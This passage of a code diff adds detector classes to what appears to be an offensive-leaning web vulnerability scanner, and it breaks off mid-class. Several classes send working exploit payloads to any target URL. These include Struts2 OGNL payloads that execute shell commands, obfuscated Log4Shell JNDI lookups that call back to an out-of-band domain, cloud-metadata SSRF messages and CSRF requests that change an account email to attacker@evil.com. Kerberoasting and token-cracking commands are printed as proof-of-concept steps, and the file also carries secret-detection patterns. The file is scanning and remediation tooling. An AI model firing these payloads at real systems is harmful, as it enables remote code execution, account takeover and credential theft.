+                if len(lengths) > 2 or len(statuses) > 1:
+                    profile.findings.append(Finding(
+                        id=f"PADDING-ORACLE-{path.replace('/','_').strip('_')[:16].upper()}",
+                        title=f"Potential CBC Padding Oracle at {path}",
+                        severity="HIGH",
+                        cvss=7.5,
+                        cwe="CWE-326",
+                        description=(
+                            f"Response length/status variance detected at {path} across {len(self.TAMPERED)} "
+                            "tampered token probes — indicates CBC padding oracle. "
+                            "Enables plaintext decryption of any token, auth bypass, and potential RCE "
+                            "via deserialization of decrypted payload."
+                        ),
+                        evidence=(
+                            "Response variation:\n" +
+                            "\n".join(f"  [{s}] len={l} t={t:.2f}s tok={tok[:20]}"
+                                      for s, l, t, tok in responses[:6])
+                        ),
+                        poc_curl=(
+                            f"# Test with padbuster:\n"
+                            f"padbuster '{url}?token=ENCRYPTED_VALUE' 'ENCRYPTED_VALUE' 8 -encoding 0\n"
+                            f"# Or poodle:\n"
+                            f"python3 padding_oracle.py --url '{url}' --param token --ciphertext ENCRYPTED_VALUE"
+                        ),
+                        category="Crypto Attack",
+                        remediation="Replace CBC encryption with AEAD (AES-GCM or ChaCha20-Poly1305). Never use CBC for authentication tokens. Apply MAC-then-Encrypt with HMAC-SHA256. Constant-time comparison for MAC verification."
+                    ))
+        return profile
+
+
+class WeakPRNGDetector:
+    """Detect predictable PRNG in session tokens and reset codes."""
+    NAME = "Weak PRNG Detector"
+    TOKEN_PATHS = [
+        "/api/session", "/login", "/auth", "/reset-password",
+        "/forgot-password", "/api/token", "/api/auth/token",
+        "/register", "/signup", "/api/register",
+        "/api/nonce", "/api/challenge",
+        "/oauth/authorize", "/api/csrf-token",
+    ]
+    WEAK_PATTERNS = [
+        # (name, pattern_description, entropy_threshold)
+        ("Sequential", "0123456789", 3.0),
+        ("Timestamp", "1[0-9]{9,}", 3.5),
+        ("Short-hex", "[0-9a-f]{8}", 3.0),
+        ("Low-entropy", "aaaaaa|111111|000000|ffffff", 0.5),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re, math
+        base = profile.url.rstrip("/")
+        tokens_seen = []
+        for path in self.TOKEN_PATHS:
+            url = base + path
+            for _ in range(3):
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 201, 302):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        hdrs = str(r.headers)
+                        for src in [body, hdrs]:
+                            toks = re.findall(r'["\s]([a-fA-F0-9]{16,64}|[A-Za-z0-9+/]{20,88}={0,2})["\s]', src)
+                            tokens_seen.extend([(t, path) for t in toks[:3]])
+                except Exception:
+                    pass
+        if len(tokens_seen) >= 2:
+            for i in range(min(len(tokens_seen) - 1, 5)):
+                t1, p1 = tokens_seen[i]
+                t2, p2 = tokens_seen[i + 1]
+                if len(t1) == len(t2) and t1 != t2:
+                    # Check entropy
+                    def entropy(s):
+                        freq = {}
+                        for c in s:
+                            freq[c] = freq.get(c, 0) + 1
+                        return -sum((f/len(s)) * math.log2(f/len(s)) for f in freq.values())
+                    e1 = entropy(t1)
+                    if e1 < 3.5:
+                        profile.findings.append(Finding(
+                            id=f"WEAK-PRNG-{p1.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"Weak PRNG / Low-Entropy Token at {p1}",
+                            severity="HIGH",
+                            cvss=7.5,
+                            cwe="CWE-338",
+                            description=(
+                                f"Token with Shannon entropy {e1:.2f} bits/char detected at {p1}. "
+                                "Low-entropy tokens are predictable by brute force or statistical analysis. "
+                                "Token 1: {t1[:20]}... | Token 2: {t2[:20]}..."
+                            ),
+                            evidence=f"Token 1: {t1[:32]}... (entropy={e1:.2f})\nToken 2: {t2[:32]}...",
+                            poc_curl=(
+                                f"# Collect multiple tokens and analyse:\n"
+                                f"for i in $(seq 1 20); do curl -sk '{base}{p1}' | "
+                                f"grep -oE '[a-fA-F0-9]{{16,64}}' | head -1; done\n"
+                                f"# Brute with hashcat:\n"
+                                f"hashcat -a 3 -m 0 token.txt '?h?h?h?h?h?h?h?h'"
+                            ),
+                            category="Crypto / PRNG",
+                            remediation="Use cryptographically secure PRNG: secrets.token_hex() in Python, crypto.randomBytes() in Node.js, SecureRandom in Java. Ensure minimum 128-bit entropy for all tokens."
+                        ))
+                        break
+        return profile
+
+
+class GRPCEndpointProber:
+    """Detect gRPC-Web endpoints, server reflection, and protobuf schema leakage."""
+    NAME = "gRPC Endpoint Prober"
+    GRPC_PATHS = [
+        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
+        "/grpc.health.v1.Health/Check",
+        "/grpc.channelz.v1.Channelz/GetTopChannels",
+        "/grpc-web/", "/grpc/",
+        "/api.v1/", "/proto/",
+        "/twirp/", "/connect/",
+    ]
+    GRPC_HEADERS = {
+        "Content-Type": "application/grpc-web+proto",
+        "X-Grpc-Web": "1",
+        "Accept": "application/grpc-web+proto",
+    }
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.GRPC_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                           b"\x00\x00\x00\x00\x00",
+                           self.GRPC_HEADERS)
+                if r and r.status in (200, 400, 415):
+                    body = (r.body or b"")[:200]
+                    hdrs = str(r.headers)
+                    if any(sig in hdrs.lower() for sig in [
+                        "grpc-status", "grpc-message", "grpc-encoding",
+                        "application/grpc", "trailer:",
+                    ]) or b"grpc" in body.lower() or b"\x00\x00" in body[:5]:
+                        profile.findings.append(Finding(
+                            id=f"GRPC-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"gRPC-Web Endpoint Detected: {path}",
+                            severity="MEDIUM",
+                            cvss=5.3,
+                            cwe="CWE-284",
+                            description=(
+                                f"gRPC or gRPC-Web endpoint detected at {path}. "
+                                "If server reflection is enabled, enumerate all services/methods. "
+                                "Probe for injection in proto fields, missing authentication, "
+                                "and insecure deserialization of protobuf messages."
+                            ),
+                            evidence=f"Headers: {hdrs[:200]} | Body: {body[:80]}",
+                            poc_curl=(
+                                f"# Enumerate via grpc_cli:\n"
+                                f"grpcurl -plaintext {profile.host}:443 list\n"
+                                f"# Or via grpc-web:\n"
+                                f"curl -sk -X POST '{url}' "
+                                f"-H 'Content-Type: application/grpc-web+proto' "
+                                f"-H 'X-Grpc-Web: 1' --data-binary @proto_payload.bin"
+                            ),
+                            category="gRPC / API",
+                            remediation="Disable gRPC server reflection in production. Apply authentication to all gRPC services. Validate all protobuf field types and ranges. Apply mTLS for service-to-service gRPC."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class KerberosHintDetector:
+    """Detect Kerberoasting / AS-REP roasting surface from auth error responses."""
+    NAME = "Kerberos Hint Detector"
+    KERBEROS_PATHS = [
+        "/api/auth", "/auth/login", "/login", "/api/login",
+        "/api/v1/auth", "/sso/login", "/kerberos", "/spnego",
+        "/api/session", "/auth/token", "/api/auth/kerberos",
+        "/ews/", "/autodiscover/autodiscover.xml",
+        "/oab/", "/rpc/", "/mapi/", "/owa/auth/",
+    ]
+    KERBEROS_INDICATORS = [
+        "SPNEGO", "Kerberos", "NTLM", "negotiate",
+        "KRB5", "GSSAPI", "GSS-API", "kerb",
+        "realm", "principal", "TGT", "service ticket",
+        "WWW-Authenticate: Negotiate", "krb5",
+        "preauthentication", "AS-REP", "TGS-REP",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.KERBEROS_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout,
+                           extra_headers={"Authorization": "Negotiate YIIJ"})
+                if r:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hdrs = str(r.headers)
+                    combined = body + hdrs
+                    hits = [ind for ind in self.KERBEROS_INDICATORS
+                            if ind.lower() in combined.lower()]
+                    if hits:
+                        profile.findings.append(Finding(
+                            id=f"KERBEROS-{path.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"Kerberos/SPNEGO Authentication Detected: {path}",
+                            severity="HIGH",
+                            cvss=7.5,
+                            cwe="CWE-287",
+                            description=(
+                                f"Kerberos/SPNEGO authentication indicators at {path}: "
+                                f"{', '.join(hits[:4])}. "
+                                "Enables AS-REP roasting (no pre-auth accounts → offline crack), "
+                                "Kerberoasting (SPN enumeration → service ticket offline crack), "
+                                "and NTLM relay attacks via MitM."
+                            ),
+                            evidence=f"Indicators: {hits[:4]}\nHeaders: {hdrs[:200]}",
+                            poc_curl=(
+                                f"curl -sk '{url}' -H 'Authorization: Negotiate YIIJ' -v 2>&1 | grep -i 'authenticate'\n"
+                                f"# Kerberoast with impacket:\n"
+                                f"python3 GetUserSPNs.py {profile.apex}/user:password -dc-ip DC_IP -request"
+                            ),
+                            category="Kerberos / AD",
+                            remediation="Require pre-authentication for all accounts. Use AES256 Kerberos encryption (disable RC4-HMAC). Apply group managed service accounts (gMSA). Monitor for TGS-REQ anomalies. Disable NTLM where possible."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class ApacheStruts2Detector:
+    """Detect Apache Struts2 versions and CVE-vulnerable patterns (S2-045, S2-052, S2-061)."""
+    NAME = "Apache Struts2 CVE Detector"
+    ACTION_PATHS = [
+        "/index.action", "/login.action", "/search.action",
+        "/register.action", "/home.action", "/default.action",
+        "/struts/", "/struts2/", "/*.action", "/api/*.action",
+        "/index.do", "/login.do", "/home.do", "/search.do",
+        "/*.do", "/index.htm", "/WEB-INF/",
+    ]
+    CVE_PAYLOADS = [
+        # S2-045: Content-Type OGNL
+        {
+            "id": "S2-045",
+            "header": "Content-Type",
+            "value": "%{(#_='multipart/form-data').(#_memberAccess['allowPrivateAccess']=true).(#_memberAccess['allowProtectedAccess']=true).(#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']).(#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties']).(#_memberAccess['allowStaticMethodAccess']=true).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
+            "indicator": "uid="
+        },
+        # S2-061: OGNL in forced evaluation
+        {
+            "id": "S2-061",
+            "header": "Content-Type",
+            "value": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
+            "indicator": "uid="
+        },
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        # Detect .action URLs
+        for path in self.ACTION_PATHS[:8]:
+            if "*" in path:
+                continue
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 302, 400):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hdrs = str(r.headers)
+                    if any(sig in body + hdrs for sig in [
+                        "struts", "Struts", "xwork", "opensymphony",
+                        "S2-", "ActionSupport", "TextProvider",
+                        "com.opensymphony", "freemarker",
+                        "WEB-INF/content/", ".action",
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"STRUTS2-DETECT-{path.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"Apache Struts2 Application Detected: {path}",
+                            severity="CRITICAL",
+                            cvss=10.0,
+                            cwe="CWE-917",
+                            description=(
+                                f"Apache Struts2 framework detected at {path}. "
+                                "If version is vulnerable (≤2.5.30 or ≤6.0.x), multiple RCE CVEs apply: "
+                                "S2-045 (Content-Type OGNL), S2-052 (REST plugin XStream), "
+                                "S2-061 (forced evaluation), S2-066 (file upload)."
+                            ),
+                            evidence=body[:200],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# S2-045 RCE probe:\n"
+                                f"curl -sk -X POST '{url}' "
+                                f"-H \"Content-Type: %{{(#_='multipart/form-data').(#cmd='id')."
+                                f"(#cmds={{'/bin/bash','-c',#cmd}}).(#p=new java.lang.ProcessBuilder(#cmds))."
+                                f"(#p.start()).text}}\""
+                            ),
+                            category="Struts2 / OGNL",
+                            remediation="Upgrade to Struts2 ≥6.3.0. Apply all CVE patches. Disable dynamic method invocation. Use allowlist for action names. Deploy ModSecurity with Struts2 ruleset."
+                        ))
+                        break
+            except Exception:
+                pass
+        return profile
+
+
+class Log4ShellFollowOn:
+    """Detect Log4Shell follow-on CVEs: Log4j2 JNDI bypass, CVE-2021-45046, Log4j 2.17.x."""
+    NAME = "Log4Shell Follow-On Detector"
+    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
+    BYPASS_PAYLOADS = [
+        # CVE-2021-44228 basic
+        "${jndi:ldap://basic.{host}.{oob}/a}",
+        # CVE-2021-45046 - context lookup bypass
+        "${${lower:j}ndi:${lower:l}dap://cve45046.{host}.{oob}/a}",
+        # Obfuscation bypass
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.{host}.{oob}/a}",
+        # Upper/lower mix
+        "${${upper:j}ndi:${upper:l}dap://upper.{host}.{oob}/a}",
+        # DNS via RMI
+        "${jndi:rmi://rmi.{host}.{oob}/a}",
+        # DNS via IIOP
+        "${jndi:iiop://iiop.{host}.{oob}/a}",
+        # DNS via DNS itself
+        "${jndi:dns://dns.{host}.{oob}/a}",
+        # Nested lookup
+        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.{host}.{oob}/a}",
+        # Log4j 2.14.1 env lookup
+        "${env:HOSTNAME}",
+        # Spring Boot banner leak
+        "${spring:application.name}",
+    ]
+    INJECT_HEADERS = [
+        "X-Api-Version", "X-Forwarded-For", "User-Agent",
+        "Referer", "Origin", "X-Request-Id", "X-Correlation-Id",
+        "X-Client-IP", "X-Real-IP", "CF-Connecting-IP",
+        "True-Client-IP", "X-Forwarded-Host", "X-Custom-Header",
+        "Authorization", "Content-Type",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        host = profile.host
+        oob = self.OOB
+        for payload_tmpl in self.BYPASS_PAYLOADS[:6]:
+            payload = payload_tmpl.format(host=host, oob=oob)
+            for header in self.INJECT_HEADERS[:5]:
+                try:
+                    r = _fetch(base + "/", cfg.ua, cfg.timeout,
+                               extra_headers={header: payload})
+                    if r and r.status in (200, 400, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if "${jndi" in body or payload[:10] in body:
+                            # payload reflected — potential info leak
+                            profile.findings.append(Finding(
+                                id=f"LOG4SHELL2-REFLECTED-{header.upper()[:14]}",
+                                title=f"Log4Shell Payload Reflected in Response via {header}",
+                                severity="CRITICAL",
+                                cvss=10.0,
+                                cwe="CWE-917",
+                                description=(
+                                    f"Log4Shell bypass payload reflected in HTTP response via {header}. "
+                                    "This may indicate the payload was processed rather than blocked. "
+                                    "Monitor OOB DNS for callback to confirm exploitation."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=(
+                                    f"curl -sk '{base}/' -H '{header}: {payload}'"
+                                ),
+                                category="Log4Shell / Java RCE",
+                                remediation="Upgrade to Log4j ≥2.17.1. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath. Apply CVE-2021-44228/45046/45105 patches."
+                            ))
+                except Exception:
+                    pass
+        # Generate OOB payloads for all headers
+        all_payloads = []
+        for hdr in self.INJECT_HEADERS[:6]:
+            payload = self.BYPASS_PAYLOADS[0].format(host=host, oob=oob)
+            all_payloads.append(
+                f"curl -sk '{base}/' -H '{hdr}: {payload}'"
+            )
+        profile.findings.append(Finding(
+            id="LOG4SHELL2-OOB-PAYLOADS",
+            title="Log4Shell Follow-On — All OOB Probe Payloads Generated",
+            severity="INFO",
+            cvss=0.0,
+            cwe="CWE-917",
+            description=(
+                f"Generated {len(self.BYPASS_PAYLOADS)} Log4Shell bypass payloads for {len(self.INJECT_HEADERS)} "
+                "injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. "
+                "Monitor for DNS callbacks confirming JNDI lookup execution."
+            ),
+            evidence="\n".join(
+                f"  [{i+1}] {p[:80]}" for i, p in enumerate(self.BYPASS_PAYLOADS)
+            ),
+            poc_curl="\n".join(all_payloads[:4]),
+            category="Log4Shell / Java RCE",
+            remediation="See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP."
+        ))
+        return profile
+
+
+class MobileAPIKeyDetector:
+    """Detect hardcoded API keys in JavaScript bundles and mobile endpoint patterns."""
+    NAME = "Mobile API Key Detector"
+    API_KEY_PATTERNS = [
+        (r'AIza[0-9A-Za-z\-_]{35}',        "Google API Key"),
+        (r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}', "Firebase Server Key"),
+        (r'sk-[a-zA-Z0-9]{48}',             "OpenAI API Key"),
+        (r'sk_live_[0-9a-zA-Z]{24,}',       "Stripe Live Key"),
+        (r'rk_live_[0-9a-zA-Z]{24,}',       "Stripe Restricted Live Key"),
+        (r'[A-Z0-9]{20}:[A-Za-z0-9+/]{40}', "Twilio Auth Token"),
+        (r'xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}', "Slack Bot Token"),
+        (r'xoxp-[0-9\-]{50,}',              "Slack User Token"),
+        (r'ghp_[A-Za-z0-9]{36}',            "GitHub Personal Access Token"),
+        (r'github_pat_[A-Za-z0-9_]{82}',    "GitHub Fine-Grained PAT"),
+        (r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "UUID/Secret"),
+        (r'AKID[A-Z0-9]{16}',               "Tencent Cloud SecretId"),
+        (r'AKIAIOSFODNN7EXAMPLE',            "AWS Placeholder Key (REPLACE)"),
+        (r'AKIA[0-9A-Z]{16}',               "AWS Access Key"),
+        (r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}', "SendGrid API Key"),
+        (r'sq0atp-[0-9A-Za-z\-_]{22}',      "Square Access Token"),
+        (r'ya29\.[0-9A-Za-z\-_]+',          "Google OAuth2 Access Token"),
+        (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "Google Client ID"),
+    ]
+    JS_BUNDLE_PATHS = [
+        "/static/js/main.chunk.js", "/static/js/app.js", "/static/js/bundle.js",
+        "/js/app.js", "/js/main.js", "/assets/index.js", "/build/app.js",
+        "/dist/app.js", "/dist/bundle.js", "/dist/main.js",
+        "/public/js/app.js", "/www/js/app.js", "/_next/static/",
+        "/assets/js/app.js", "/static/bundle.js",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        for path in self.JS_BUNDLE_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    for pattern, key_type in self.API_KEY_PATTERNS:
+                        matches = re.findall(pattern, body)
+                        if matches:
+                            profile.findings.append(Finding(
+                                id=f"APIKEY-{key_type.replace(' ','_').upper()[:16]}-JS",
+                                title=f"Hardcoded {key_type} in JavaScript Bundle",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-798",
+                                description=(
+                                    f"{key_type} found hardcoded in {path}. "
+                                    f"Found {len(matches)} instance(s). "
+                                    "Exposed to all users — enables full API access / account takeover."
+                                ),
+                                evidence=f"Key sample: {matches[0][:40]}...",
+                                poc_curl=f"curl -sk '{url}' | grep -oE '{pattern[:40]}'",
+                                category="Secrets / Hardcoded Keys",
+                                remediation=f"Revoke {key_type} immediately. Move secrets to server-side environment variables. Use backend proxy for all {key_type} calls. Implement secret scanning in CI/CD (git-secrets, TruffleHog, Gitleaks)."
+                            ))
+            except Exception:
+                pass
+        return profile
+
+
+class WebSocketSSRFDetector:
+    """Detect WebSocket connection upgrade used to pivot to internal SSRF."""
+    NAME = "WebSocket SSRF Detector"
+    WS_ENDPOINTS = [
+        "/ws", "/websocket", "/socket", "/socket.io/", "/ws/",
+        "/api/ws", "/api/websocket", "/stream", "/events",
+        "/live", "/realtime", "/notify", "/push",
+        "/stomp", "/mqtt", "/amqp-ws",
+    ]
+    WS_PAYLOADS = [
+        '{"type":"connect","url":"http://169.254.169.254/latest/meta-data/"}',
+        '{"action":"fetch","target":"http://169.254.169.254/"}',
+        '{"cmd":"proxy","url":"http://internal.service/"}',
+        '{"subscribe":"http://metadata.google.internal/computeMetadata/v1/"}',
+        '{"type":"request","method":"GET","url":"http://localhost:8080/admin"}',
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.WS_ENDPOINTS:
+            url = base + path
+            try:
+                # Probe for WS upgrade acceptance
+                r = _fetch(url, cfg.ua, cfg.timeout, extra_headers={
+                    "Upgrade": "websocket",
+                    "Connection": "Upgrade",
+                    "Sec-WebSocket-Version": "13",
+                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                })
+                if r and r.status in (101, 200, 400, 426):
+                    hdrs = str(r.headers)
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in hdrs.lower() for sig in [
+                        "upgrade: websocket", "101 switching", "websocket",
+                        "sec-websocket-accept", "socket.io"
+                    ]) or r.status in (101, 426):
+                        profile.findings.append(Finding(
+                            id=f"WSSSRF-{path.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"WebSocket SSRF Attack Surface: {path}",
+                            severity="HIGH",
+                            cvss=7.5,
+                            cwe="CWE-918",
+                            description=(
+                                f"WebSocket endpoint {path} accepts upgrade requests. "
+                                "If WebSocket messages are forwarded to internal URLs or "
+                                "processed as proxy commands, enables SSRF to internal services, "
+                                "cloud IMDS, and private network scanning."
+                            ),
+                            evidence=f"HTTP {r.status} | Headers: {hdrs[:200]}",
+                            poc_curl=(
+                                f"# Test WebSocket SSRF via wscat:\n"
+                                f"wscat -c 'ws://{profile.host}{path}' "
+                                f"--execute '{self.WS_PAYLOADS[0]}'\n"
+                                f"# Or via curl upgrade:\n"
+                                f"curl -sk -i -N -H 'Upgrade: websocket' "
+                                f"-H 'Connection: Upgrade' "
+                                f"-H 'Sec-WebSocket-Version: 13' "
+                                f"-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' '{url}'"
+                            ),
+                            category="WebSocket / SSRF",
+                            remediation="Validate all WebSocket messages. Never forward WebSocket data to internal URLs. Implement URL allowlist for any proxy functionality. Apply authentication before WebSocket upgrade."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class HelmChartSecretDetector:
+    """Detect Helm chart values, Kubernetes secrets, and CI/CD credential exposure."""
+    NAME = "Helm Chart Secret Detector"
+    HELM_PATHS = [
+        "/helm/values.yaml", "/charts/values.yaml", "/k8s/values.yaml",
+        "/deploy/values.yaml", "/values.yaml", "/k8s/secrets.yaml",
+        "/kubernetes/secrets.yaml", "/manifests/secrets.yaml",
+        "/k8s/configmap.yaml", "/deploy/configmap.yaml",
+        "/docker-compose.yml", "/docker-compose.yaml",
+        "/docker-compose.prod.yml", "/docker-compose.production.yml",
+        "/terraform.tfvars", "/terraform.tfstate",
+        "/ansible/group_vars/all.yml", "/playbook.yml",
+        "/.kube/config", "/kubeconfig",
+    ]
+    SECRET_KEYS = [
+        "password:", "secret:", "token:", "apiKey:", "api_key:",
+        "db_password:", "database_password:", "jwt_secret:",
+        "private_key:", "client_secret:", "service_account:",
+        "AWS_SECRET", "STRIPE_SECRET", "SENDGRID", "TWILIO",
+        "connectionString:", "mongodbUri:", "postgresUri:",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.HELM_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hits = [k for k in self.SECRET_KEYS if k.lower() in body.lower()]
+                    if hits or "apiVersion:" in body or "kind:" in body:
+                        profile.findings.append(Finding(
+                            id=f"HELM-SECRET-{path.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"Infrastructure Credential/Config Exposed: {path}",
+                            severity="CRITICAL" if hits else "HIGH",
+                            cvss=9.8 if hits else 7.5,
+                            cwe="CWE-538",
+                            description=(
+                                f"Infrastructure configuration file {path} accessible. "
+                                + (f"Secret keys detected: {', '.join(hits[:5])}. "
+                                   if hits else
+                                   "Kubernetes/Helm configuration exposed. ")
+                                + "Exposes database credentials, API keys, cloud service accounts, "
+                                "and deployment infrastructure details."
+                            ),
+                            evidence=body[:400],
+                            poc_curl=f"curl -sk '{url}'",
+                            category="Infrastructure Secrets",
+                            remediation="Remove all infrastructure configs from web root. Use sealed-secrets or external-secrets operator for K8s secrets. Encrypt Helm values. Never commit plaintext secrets to repos."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class InternalAPIGatewayDetector:
+    """Detect internal API gateway routes, admin APIs, and inter-service communication leaks."""
+    NAME = "Internal API Gateway Detector"
+    GATEWAY_PATHS = [
+        "/internal/", "/internal/api/", "/api/internal/",
+        "/_internal/", "/private/", "/api/private/",
+        "/admin/api/", "/api/admin/", "/management/",
+        "/actuator/gateway/routes", "/actuator/gateway/globalfilters",
+        "/gateway/routes", "/routes",
+        "/api/gateway/", "/proxy/", "/api/proxy/",
+        "/service/", "/services/", "/microservice/",
+        "/api/health/all", "/api/status/all",
+        "/api/v1/system/", "/system/info",
+        "/api/debug/routes", "/debug/routes",
+        "/swagger-ui/index.html", "/swagger-ui.html",
+        "/api-docs", "/v2/api-docs", "/v3/api-docs",
+        "/openapi.json", "/openapi.yaml",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.GATEWAY_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 201):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"routes"', '"route"', '"filters"', '"predicates"',
+                        '"services"', '"microservices"', '"endpoints"',
+                        '"swagger"', '"openapi"', '"paths":', '"info":',
+                        '"servers":', '"tags":', '"components":',
+                        "swagger", "OpenAPI", "Swagger UI",
+                        "http://", "grpc://", "ws://",
+                        '"uri":', '"lb://', '"http://',
+                    ]):
+                        is_critical = any(s in body for s in [
+                            '"lb://', 'internal', 'private', 'admin'
+                        ])
+                        profile.findings.append(Finding(
+                            id=f"GATEWAY-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"API Gateway/Internal Routes Exposed: {path}",
+                            severity="CRITICAL" if is_critical else "HIGH",
+                            cvss=9.1 if is_critical else 7.5,
+                            cwe="CWE-284",
+                            description=(
+                                f"API gateway route configuration or internal API at {path}. "
+                                "Exposes: internal service addresses (lb://service-name), "
+                                "private endpoint URLs, microservice architecture, "
+                                "authentication bypass routes, and undocumented admin APIs."
+                            ),
+                            evidence=body[:400],
+                            poc_curl=f"curl -sk '{url}' | python3 -m json.tool",
+                            category="API Gateway",
+                            remediation="Restrict all internal/admin routes to internal network. Apply authentication on gateway management API. Use separate port for management (never expose publicly). Audit all route configurations."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class CSRFAdvancedDetector:
+    """Detect advanced CSRF: SameSite bypass, token fixation, JSON CSRF, and Flash-based CSRF."""
+    NAME = "CSRF Advanced Detector"
+    CSRF_PATHS = [
+        "/api/user/update", "/api/password/change", "/api/email/change",
+        "/api/account/settings", "/api/profile/update",
+        "/api/admin/create", "/api/user/delete",
+        "/api/transfer", "/api/payment",
+        "/settings", "/account", "/profile",
+        "/api/v1/user", "/api/v2/user",
+    ]
+    CSRF_PAYLOADS = [
+        # JSON CSRF via text/plain
+        ("text/plain", '{"email":"attacker@evil.com","__proto__":null}'),
+        # application/x-www-form-urlencoded
+        ("application/x-www-form-urlencoded", "email=attacker%40evil.com&role=admin"),
+        # multipart/form-data CSRF
+        ("multipart/form-data; boundary=xxxx", "--xxxx\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nattacker@evil.com\r\n--xxxx--"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.CSRF_PATHS[:8]:
+            url = base + path
+            for ctype, body_data in self.CSRF_PAYLOADS:
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                               body_data.encode(),
+                               {"Content-Type": ctype,
+                                "Origin": "https://evil.com",
+                                "Referer": "https://evil.com/csrf.html"})
+                    if r and r.status in (200, 201):
+                        body_resp = (r.body or b"").decode("utf-8", errors="replace")
+                        acao = r.headers.get("access-control-allow-origin", "")
+                        if any(sig in body_resp for sig in [
+                            '"success"', '"updated"', '"changed"', '"ok"',
+                            '"user"', '"profile"', '"account"',
+                            "success", "updated", "changed"
+                        ]):
+                            samesite = "SameSite" not in str(profile.findings)
+                            profile.findings.append(Finding(
+                                id=f"CSRF-ADV-{ctype[:12].replace('/','-').replace(';','').upper()}-{path.replace('/','_')[:12].upper()}",
+                                title=f"Advanced CSRF — {ctype.split(';')[0]} accepted at {path}",
+                                severity="HIGH",
+                                cvss=8.1,
